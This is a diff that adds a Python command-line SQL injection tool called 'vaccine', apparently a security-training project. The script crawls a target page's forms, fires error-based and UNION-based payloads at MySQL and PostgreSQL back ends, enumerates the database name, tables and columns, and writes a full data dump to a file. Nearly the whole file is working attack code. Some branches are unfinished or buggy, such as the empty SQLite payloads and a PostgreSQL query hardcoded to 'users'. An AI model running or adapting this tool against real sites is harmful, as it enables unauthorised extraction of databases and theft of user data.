@@ -1,0 +1,319 @@
+#!/usr/bin/env python3
+
+from bs4 import BeautifulSoup
+from colorama import Fore, Style
+from urllib.parse import urljoin
+from difflib import unified_diff
+from prettytable import PrettyTable
+import argparse
+import datetime
+import httpx
+import pprint
+import re
+import injection
+
+DESCRIPTION = '''\
+-----------------------------------------------------------------------------------------------------------
+Description:
+ A SQL Injection tool that scans the given URL to detect vulnerable parameters
+ and extract database information. The results will be optionally saved to a file.
+-----------------------------------------------------------------------------------------------------------'''
+
+EPILOG = '''\
+-----------------------------------------------------------------------------------------------------------
+• Each header must be provided as a key:value pair (e.g., "User-Agent=vaccine/1.0").
+• This tool currently supports MySQL and PostgreSQL injection techniques.
+• The defutal of output path is ./defualt_one.txt
+-----------------------------------------------------------------------------------------------------------'''
+
+ERRORS = {
+    'mysql': '(1064, "You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near',
+    'pgsql': 'unterminated quoted string at or near',
+    'sqlite': 'unrecognized token:',
+}
+
+payloads = []
+outputs = []
+
+def main() -> int:
+    try:
+        global outputs
+        args = args_parse()
+        if args.header:
+            args.header = header_check(args.header)
+            if not args.header:
+                raise Exception('invalid format of HTTP header.')
+        my_injection(args.url, args.method, args.output, args.header)
+        write_output(outputs, args.output, args.url, args.method)
+    except KeyboardInterrupt:
+        return 1
+    except Exception as e:
+        return error(e, 1)
+    return 0
+
+def header_check(header: list) -> dict:
+    result = {}
+    for i in header:
+        tmp = i.split('=')
+        if len(tmp) != 2:
+            return None
+        result[tmp[0].strip()] = tmp[1].strip()
+    return result
+  
+def my_injection(url, method, output, header):
+    global payloads
+    global outputs
+    first_response = httpx.get(url, headers=header)
+    soup = BeautifulSoup(first_response.text, 'lxml')
+    if (soup.find(class_="text-danger")):
+        soup.find(class_="text-danger").decompose()
+    response = {'text': str(soup), 'url': url, 'header': header}
+    forms = get_form(soup, method)
+    for form in forms:
+        result = {'url': response['url'], 'type': "", 'params': [], 'payload': [], 'name': "", 'tables': [] }
+        db_type = check_database_type(response, form, output)
+        if not db_type: return error("Database type not support.", 1)
+        result['params'] += [input for input in form['inputs']]
+        result['type'] = db_type['type']
+        if not 'redirect' in db_type['type']:
+            result['name'] = p_content(response, form, injection.DBNAME_PAYLOAD[result['type']], db_type['regx'])
+            result['tables'], output_col = create_tables(response, form, injection.TABLE_PAYLOAD[result['type']])
+            for index, table in enumerate(result['tables']):
+                result['tables'][index]['columns'] = get_columns(table, response, form, db_type)
+                result['tables'][index]['data'] = get_data(table['name'], result['tables'][index]['columns'], output_col, response, form, db_type)
+        result['payload'] = payloads.copy()
+        payloads.clear()
+        outputs.insert(0, result.copy())
+    return
+
+def get_columns(table, first_response, form, db_type):
+    columns = []
+    count = 0
+    while True:
+        payload = column_payload(table['name'], count, db_type['type'])
+        column = p_content(first_response, form, payload, db_type['regx'])
+        if not column:
+            break
+        columns.append(column)
+        count += 1
+    return columns
+
+def get_data(table, columns, output_col, first_response, form, db_type):
+    data = []
+    count = 0
+    column_len = len(columns)
+    while count < column_len:
+        field = columns[count:count + output_col] + ['null'] * (output_col - len(columns[count:count + output_col]))
+        payload = data_payload(field, db_type['type'], table)
+        contents = table_content(first_response, form, payload)
+        if not contents: return []
+        if len(data) == 0:
+            for i in contents:
+               data.append(i.copy())
+        else:
+            for i, value in enumerate(contents):
+                data[i] += value.copy()
+        count += output_col
+    return data
+
+def data_payload(field, db_type, table_name):
+    if db_type == 'mysql':
+        return "' UNION ALL SELECT " + ", ".join(field) + f" FROM {table_name} -- -"
+    elif db_type == 'pgsql':
+        new_field = [f"CAST({item} AS text)" for item in field]
+        return "0' UNION SELECT " + ", ".join(new_field) + " FROM users -- -"
+    elif db_type == 'sqlite':
+        return f""
+    return None
+
+def write_output(injected_database, path, url, method= 'GET'):
+    with open(path, 'a+') as file:
+        content = f"URL : {url}\n"
+        content += f"Date: {str(datetime.datetime.now()).split('.')[0]}\n"
+        for count, database in enumerate(injected_database):
+            content += f'\n -- INFOMATION[{count + 1}] -------\n'
+            content += '-------------------------------------------------------------------------------\n'
+            content += f" [+] Vulnerable Parameters:\n"
+            for i in database['params']:
+                content += f"     [-] {i['name']}: [ type: {i['type']} ]\n"
+            content += f" [+] Database Type: {database['type']}\n"
+            if not database['name'] == '':
+                content += f" [+] Database Name: {database['name']}\n"
+            content += f" [+] Payloads Used: \n"
+            for i in database['payload']:
+                content += f"     [-] {i}\n"
+            if not database['tables']:
+                continue
+            content += '\n -- COMPLEATE DATABASE DUMP -------\n'
+            content += '-------------------------------------------------------------------------------\n'
+            for item in database['tables']:
+                content += f" [+] Table Name:\n     [-] {item['name']}\n"
+                if not 'columns' in item:
+                    continue
+                table = PrettyTable(remove_duplicate(item['columns']))
+                for record in item['data']:
+                    table.add_row(record[0:len(item['columns'])])
+                for line in table.get_string().splitlines():
+                    content += f"     {line}\n"
+                content += '\n'
+        content += ' -- SCAN SUMMARY -------\n'
+        content += '-------------------------------------------------------------------------------\n'
+        content += 'Tested injection methods: Error-based, Boolean-based, Union_based, Bind_based\n'
+        content += '-------------------------------------------------------------------------------\n'
+        file.write(content + '\n')
+    return
+
+def get_content(first_response, form, payload, regx=None, len=0):
+    try:
+        soup, _ = db_inject(first_response, form, payload, first_response['header'])
+        content = soup.find('p').get_text(strip=True)
+        if content:
+            return (re.search(regx, content).group(1))
+        body = soup.find('table').find('tbody')
+        if body:
+            data = []
+            tmp = []
+            for i in body.find_all('tr'):
+                for j in i.find_all('td'):
+                    tmp.append(j.get_text(strip=True))
+                data.append(tmp.copy())
+                tmp.clear()
+            return data
+    except Exception:
+        return None
+
+def p_content(first_response, form, payload, regx):
+    soup, _ = db_inject(first_response, form, payload, first_response['header'])
+    if not soup or not soup.find('p'):
+        return None
+    content = soup.find('p').get_text(strip=True)
+    a = re.search(regx, content)
+    return (re.search(regx, content).group(1))
+
+def table_content(first_response, form, payload):
+    soup, _ = db_inject(first_response, form, payload, first_response['header'])
+    if not soup.find('table'):
+        return None
+    body = soup.find('table').find('tbody')
+    data = []
+    tmp = []
+    for i in body.find_all('tr'):
+        for j in i.find_all('td'):
+            tmp.append(j.get_text(strip=True))
+        data.append(tmp.copy())
+        tmp.clear()
+    return data
+
+def db_inject(first_response, form, payload, headers):
+    global payloads
+    data = {}
+    for input in form['inputs']:
+        data[input['name']] = payload
+    if form['method'] == 'get':
+        response = httpx.get(first_response['url'], params=data, headers=headers)
+    elif form['method'] == 'post':
+        response = httpx.post(first_response['url'], data=data, headers=headers)
+    line_diff = unified_diff(first_response['text'].splitlines(), response.text.splitlines(), lineterm='')
+    diff = '\n'.join(line_diff)
+    payloads.append(payload)
+    return BeautifulSoup(diff, 'lxml'), response
+
+def check_database_type(first_response, form, output) -> object:
+    global payloads
+    soup, _ = db_inject(first_response, form, "'", headers=first_response['header'])
+    for key, value in ERRORS.items():
+        if value in soup.find("p").get_text(strip=True):
+            return injection.DB_TYPE[key]
+    soup, response = db_inject(first_response, form, "' OR '1' = '1' -- -", headers=first_response['header'])
+    if response.status_code == 302:
+        url = urljoin(str(response.url), response.headers['Location']) + '/'
+        tmp = payloads.copy()
+        payloads.clear()
+        my_injection(url, "get", output)
+        result = injection.DB_TYPE['redirect']
+        result['type'] = f"redirect: {url}"
+        payloads = tmp
+        return result
+    return None
+# TODO
+def create_tables(first_response, form, payload):
+    soup, _ = db_inject(first_response, form, payload, first_response['header'])
+    body = soup.find('table').find('tbody')
+    tables = []
+    for i in body.find_all('tr'):
+        for j in i.find_all('td'):
+            name = j.get_text(strip=True)
+            if name:
+                tables.append({'name': name})
+    return tables, len(body.find('tr').find_all('td'))
+
+def get_form(soup, method: str) -> list:
+    forms = []
+    for i in soup.find_all("form"):
+        if i.get('method').lower() == method:
+            form = {
+                "method": i.get('method').lower(),
+                "action": i.get("action"),
+                "inputs": []}
+            for input in i.find_all("input"):
+                form["inputs"].append({
+                    "name": input.get("name"),
+                    "type": input.get("type"),
+                    "id": input.get("id"),
+                })
+            forms.append(form)
+    return forms
+# TODO
+def column_payload(table_name, index, db_type):
+    if db_type == 'mysql': 
+        return f"' AND updatexml(NULL, CONCAT(0x3a, (SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '{table_name}' LIMIT {index},1)), NULL) -- -"
+    elif db_type == 'pgsql':
+        return f"1' AND 1=CAST((SELECT CAST(column_name AS text) FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1 OFFSET {index}) AS integer)-- -",
+    elif db_type == 'sqlite':
+        return f""
+
+def remove_duplicate(column):
+    size = len(column)
+    index = 0
+    while index < size:
+        count = index - 1
+        while count >= 0:
+            if (column[index] == column[count]):
+                column[index] += ' '
+                break
+            count -= 1
+        index += 1
+    return column
+
+# TODO
+def args_parse() -> argparse.ArgumentParser:
+    paser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,
+                                    prog="vaccine", description=DESCRIPTION, epilog=EPILOG,)
+    paser.add_argument('-o', "--output",
+                       metavar="FILE",
+                       default="defualt_one.txt",
+                       help="Specify a file to save the output of the injection process.",)
+    paser.add_argument('-X', "--method",
+                       metavar="MEDTHOD",
+                       default="get",
+                       type=str.lower,
+                       choices=["post", "get"],
+                       help="The HTTP request method to use (GET or POST)",)
+    paser.add_argument('-H', "--header",
+                       action="extend",
+                       metavar="HEADER",
+                       nargs='+',
+                       type=str,
+                       help="Additional request headers in the format: Key=Value",)
+    paser.add_argument('url',
+                       metavar="URL",
+                       help="The target URL to scan for SQL injection vulnerabilities.",)
+    return paser.parse_args()
+
+def error(message: str, code: int = None) -> int:
+    print(f"{Fore.RED}[ERROR]{Style.RESET_ALL} {message}")
+    return code
+
+if __name__ == "__main__":
+    main()
+
